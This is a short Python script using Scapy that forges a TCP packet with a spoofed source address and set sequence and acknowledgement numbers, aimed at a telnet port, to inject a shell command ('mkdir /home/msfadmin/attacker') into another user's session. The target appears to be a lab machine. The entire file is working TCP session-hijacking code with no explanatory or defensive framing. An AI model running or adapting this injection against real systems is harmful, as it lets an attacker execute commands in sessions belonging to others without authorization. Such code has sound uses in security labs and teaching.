#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.190", dst = "10.10.10.195")
TCPLayer = TCP (sport=56236, dport=23, flags="A", seq=1794701515, ack=920125085)

data = "\n mkdir /home/msfadmin/attacker \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)

send(pkt,verbose=0)
